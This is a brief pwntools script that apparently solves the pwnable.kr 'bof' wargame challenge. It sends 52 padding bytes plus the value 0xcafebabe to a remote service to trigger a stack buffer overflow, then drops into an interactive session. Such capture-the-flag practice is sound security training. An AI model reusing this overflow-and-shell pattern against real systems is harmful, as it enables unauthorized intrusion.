from pwn import *

conn = remote('pwnable.kr',9000)

payload = p32(0xcafebabe)

conn.sendline(b"A"*52+payload)

conn.interactive()
